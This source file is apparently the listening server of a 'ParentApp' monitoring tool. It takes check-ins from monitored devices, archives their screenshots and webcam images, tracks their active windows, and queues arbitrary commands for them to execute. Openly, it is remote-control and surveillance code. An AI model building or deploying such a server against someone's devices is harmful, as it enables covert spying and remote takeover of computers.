# =============================================================================
# ParentApp/core/bg_server.dz — Dedicated Master TCP Server Thread
# Handles Reverse Check-ins, Liveness, Real-time Sessions & Commands
# =============================================================================

use net
use process
use file
use dir
use path
use json
use datetime
import "constants.dz" as constants

let MASTER_PORT     = constants.MASTER_PORT
let SECRET_KEY      = constants.SECRET_KEY
let OFFLINE_TIMEOUT = 3.5
let MAX_SCREENSHOTS = 100   # Max stored files per device per type before rotation
let LOG_FILE        = ""    # Set after BASE_DIR is known

let BASE_DIR = "."
if file.exists("ParentApp/main.dz")
    BASE_DIR = "ParentApp"
end

let LOG_FILE        = path.join(BASE_DIR, "storage", "app.log")
let DEVICES_FILE    = path.join(BASE_DIR, "children.json")
let PENDING_CMDS_FILE = path.join(BASE_DIR, "storage", "pending_cmds.json")
let RESULTS_DIR     = path.join(BASE_DIR, "storage", "results")

# ─── Logging ──────────────────────────────────────────────────────────────────
fn logMsg(level, msg)
    try
        let now = datetime.now()
        let ts = str(int(now.year())) + "-" + str(int(now.month())).zFill(2) + "-" + str(int(now.day())).zFill(2) + " " + str(int(now.hour())).zFill(2) + ":" + str(int(now.minute())).zFill(2) + ":" + str(int(now.second())).zFill(2)
        let line = "[" + ts + "] [" + level + "] " + msg + "\n"
        print(line.strip())
        # Rotate log if > 1MB
        try
            let st = file.stat(LOG_FILE)
            if st.has("size") and st["size"] > 1048576
                file.delete(LOG_FILE)
            end
        catch e end
        file.append(LOG_FILE, line)
    catch e end
end

# ─── Storage Directory Helpers ────────────────────────────────────────────────
fn getSsDir(deviceId)
    let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
    let d = path.join(BASE_DIR, "storage", "screenshots", safeId)
    try dir.createAll(d) catch e end
    return d
end

fn getWcDir(deviceId)
    let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
    let d = path.join(BASE_DIR, "storage", "webcam", safeId)
    try dir.createAll(d) catch e end
    return d
end

# ─── Storage Rotation ─────────────────────────────────────────────────────────
# Keep only the newest MAX_SCREENSHOTS files — delete the oldest ones.
fn rotateStorage(dirPath)
    try
        let files = dir.list(dirPath)
        if files.length() <= MAX_SCREENSHOTS return end
        # Sort ascending (oldest first) — bubble sort
        if files.length() > 1
            for i in 0..(files.length() - 2)
                for j in (i + 1)..(files.length() - 1)
                    if files[i] > files[j]
                        let tmp = files[i]
                        files[i] = files[j]
                        files[j] = tmp
                    end
                end
            end
        end
        # Delete oldest files until we're under the limit
        let toDelete = files.length() - MAX_SCREENSHOTS
        for i in 0..(toDelete - 1)
            try file.delete(path.join(dirPath, files[i])) catch e end
        end
        logMsg("INFO", "[Rotation] Deleted " + str(toDelete) + " old files from " + dirPath)
    catch e end
end

# ─── Auto Archive ─────────────────────────────────────────────────────────────
fn autoArchive(deviceId, rawData)
    if isNull(rawData) or type(rawData) != "String"
        return
    end

    let now = datetime.now()
    let ts = str(int(now.year())) + "-" + str(int(now.month())).zFill(2) + "-" + str(int(now.day())).zFill(2) + "_" + str(int(now.hour())).zFill(2) + "-" + str(int(now.minute())).zFill(2) + "-" + str(int(now.second())).zFill(2)
    let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")

    if rawData.startsWith("SCREENSHOT:")
        let b64 = rawData.slice(11).strip()
        if b64 != "" and !b64.startsWith("ERR:")
            let sDir = getSsDir(safeId)
            let filePath = path.join(sDir, ts + ".jpg")
            try
                use crypto
                use bytes
                let imgBytes = bytes.fromString(crypto.base64Decode(b64))
                # Validate JPEG magic bytes: 0xFF 0xD8
                if imgBytes.length() < 2 or imgBytes[0] != 255 or imgBytes[1] != 216
                    logMsg("WARN", "[Archive] Rejected invalid JPEG for " + deviceId)
                    return
                end
                file.writeBytes(filePath, imgBytes)
                rotateStorage(sDir)
                logMsg("INFO", "[Archive] Screenshot saved: " + filePath)
            catch e
                logMsg("ERROR", "[Archive] Screenshot failed for " + deviceId + ": " + str(e))
            end
        end
    elif rawData.startsWith("WEBCAM:")
        let b64 = rawData.slice(7).strip()
        if b64 != "" and b64 != "NO_WEBCAM" and !b64.startsWith("ERR:")
            let wDir = getWcDir(safeId)
            let filePath = path.join(wDir, ts + ".jpg")
            try
                use crypto
                use bytes
                let imgBytes = bytes.fromString(crypto.base64Decode(b64))
                # Validate JPEG magic bytes
                if imgBytes.length() < 2 or imgBytes[0] != 255 or imgBytes[1] != 216
                    return
                end
                file.writeBytes(filePath, imgBytes)
                rotateStorage(wDir)
            catch e end
        end
    end
end


# In-memory session tracking
let sessions = {}

# Load existing devices with offline initial state
try
    if file.isFile(DEVICES_FILE)
        let dData = file.read(DEVICES_FILE)
        let list = json.decode(dData)
        if type(list) == "Array"
            for d in list
                if type(d) == "Map" and d.has("id")
                    d["is_online"] = False
                    d["last_seen"] = 0
                    sessions[d["id"]] = d
                end
            end
            file.write(DEVICES_FILE, json.encode(list))
        end
    end
catch e end

# Master TCP Server Instance
let srv = new net.tcpServer(fn(client, clientIp, clientPort)
    try
        let raw = client.receiveAll()
        if isNull(raw) or raw == ""
            client.close()
            return
        end

        let req = Null
        try 
            req = json.decode(raw) 
        catch e 
            client.close() 
            return 
        end
        
        if type(req) != "Map" or !req.has("id") or !req.has("secret")
            client.close()
            return
        end

        if req["secret"] != SECRET_KEY
            client.close()
            return
        end

        let devId = req["id"]
        let hostname = clientIp
        if req.has("hostname") and req["hostname"] != ""
            hostname = req["hostname"]
        end
        let reportedIp = clientIp
        if req.has("ip") and req["ip"] != ""
            reportedIp = req["ip"]
        end
        let nowTs = datetime.now().timestamp()

        # Update or create session
        if !sessions.has(devId)
            sessions[devId] = {
                "id": devId,
                "hostname": hostname,
                "custom_name": "",
                "ip": reportedIp,
                "is_online": True,
                "last_seen": nowTs,
                "active_window": "",
                "processes_changed": False
            }
            if req.has("active_window")
                sessions[devId]["active_window"] = req["active_window"]
            end
            if req.has("processes_changed")
                sessions[devId]["processes_changed"] = req["processes_changed"]
            end
        else
            let s = sessions[devId]
            s["hostname"] = hostname
            s["ip"] = reportedIp
            s["is_online"] = True
            s["last_seen"] = nowTs
            if req.has("active_window")
                s["active_window"] = req["active_window"]
            end
            if req.has("processes_changed")
                s["processes_changed"] = req["processes_changed"]
            end
        end

        # Sync sessions map to children.json without overwriting UI changes (custom_name)
        try
            let diskSessions = {}
            if file.isFile(DEVICES_FILE)
                let dData = file.read(DEVICES_FILE)
                let list = json.decode(dData)
                if type(list) == "Array"
                    for d in list
                        if type(d) == "Map" and d.has("id")
                            diskSessions[d["id"]] = d
                        end
                    end
                end
            end
            
            let finalList = []
            let toRemove = []
            for id in sessions.keys()
                let s = sessions[id]
                if diskSessions.has(id)
                    let dS = diskSessions[id]
                    if dS.has("custom_name")
                        s["custom_name"] = dS["custom_name"]
                    end
                    finalList.append(s)
                else
                    # Device was deleted from UI!
                    if (nowTs - s["last_seen"]) >= 5.0
                        toRemove.append(id)
                    else
                        finalList.append(s)
                    end
                end
            end
            
            for id in toRemove
                sessions.remove(id)
            end
            
            # Atomic-like write using safe write fallback
            let outJson = json.encode(finalList)
            try
                file.write(DEVICES_FILE + ".tmp", outJson)
                try file.delete(DEVICES_FILE) catch e end
                file.rename(DEVICES_FILE + ".tmp", DEVICES_FILE)
            catch e
                file.write(DEVICES_FILE, outJson)
            end
        catch e end

        # Handle returned command output
        if req.has("result_cmd_id") and req["result_cmd_id"] != ""
            let cId = req["result_cmd_id"]
            let resData = ""
            if req.has("result")
                resData = req["result"]
            end
            let resFile = path.join(RESULTS_DIR, cId + ".json")
            try file.write(resFile, json.encode({"data": resData})) catch e end
            autoArchive(devId, resData)
        end

        # Check for pending commands to dispatch to child
        let replyPayload = {"status": "OK", "action": "IDLE"}
        try
            if file.isFile(PENDING_CMDS_FILE)
                let pData = file.read(PENDING_CMDS_FILE)
                let pMap = json.decode(pData)
                if type(pMap) == "Map" and pMap.has(devId)
                    let q = pMap[devId]
                    if type(q) == "Array"
                        let nextCmd = Null
                        let modified = False
                        let now = datetime.now().timestamp()
                        
                        # Pop from queue until we find a valid (non-expired) command
                        while q.length() > 0
                            let candidate = q.pop(0)
                            modified = True
                            let cmdTs = now
                            if type(candidate) == "Map" and candidate.has("timestamp")
                                cmdTs = num(candidate["timestamp"])
                            end
                            
                            # If command is older than 15 seconds, it's expired! Skip it.
                            if (now - cmdTs) > 15.0
                                continue
                            end
                            
                            nextCmd = candidate
                            break
                        end
                        
                        if !isNull(nextCmd)
                            replyPayload = {
                                "status": "OK",
                                "action": "EXEC",
                                "cmd_id": nextCmd["cmd_id"],
                                "command": nextCmd["command"]
                            }
                        end
                        
                        if modified
                            let pOut = json.encode(pMap)
                            try
                                file.write(PENDING_CMDS_FILE + ".tmp", pOut)
                                try file.delete(PENDING_CMDS_FILE) catch e end
                                file.rename(PENDING_CMDS_FILE + ".tmp", PENDING_CMDS_FILE)
                            catch e
                                file.write(PENDING_CMDS_FILE, pOut)
                            end
                        end
                    end
                end
            end
        catch e end

        client.send(json.encode(replyPayload))
        client.shutdown(net.SD_SEND)
        client.close()
    catch err
        logMsg("ERROR", "[Server] Client handler error: " + str(err))
        try client.close() catch e end
    end
end)

# Start listening
print("[Master Server] Background TCP Server listening on 0.0.0.0:" + str(MASTER_PORT))
try
    srv.listen(MASTER_PORT)
catch e
    print("[Master Server] Listen error: " + str(e))
end
